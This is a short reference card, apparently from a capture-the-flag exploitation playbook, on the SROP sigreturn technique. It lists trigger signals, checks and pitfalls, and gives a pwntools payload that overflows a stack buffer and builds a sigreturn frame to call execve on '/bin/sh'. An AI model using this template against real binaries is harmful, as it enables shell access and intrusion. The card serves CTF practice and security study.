# Card: pwn.primitive.srop_sigreturn

## Trigger Signals
- syscall; ret
- rax=15 controllable or read returns 15
- controlled stack

## Core Idea
SROP sigreturn frame. Convert observed signals into the smallest primitive probe before closure work.

## Minimal Probe

```python
frame = SigreturnFrame()
frame.rax = 59; frame.rdi = binsh; frame.rip = syscall_ret
payload = b"A"*off + p64(pop_rax)+p64(15)+p64(syscall_ret)+bytes(frame)
```

## Confirm Oracle
Registers match frame and syscall executes.

## Falsify Oracle
Cannot set rax=15 or no syscall gadget.

## Common Targets
- GOT / stack / heap / global object targets depending on trigger.

## Closure Paths
- SROP, ORW

## Version / Mitigation Notes
- Check PIE, canary, NX, RELRO, CET, seccomp, and glibc version before closure.

## Pitfalls
- Do not promote closure work before this primitive is minimally verified or falsified.
- Complex closure failure does not necessarily falsify the primitive.

## Anti-patterns
- Technique-name-first reasoning before signal-to-primitive compression.

## Related Cards
- SROP, ORW

## Example Micro-Challenges
- Add a minimal C challenge or retained sample that exposes these trigger signals.
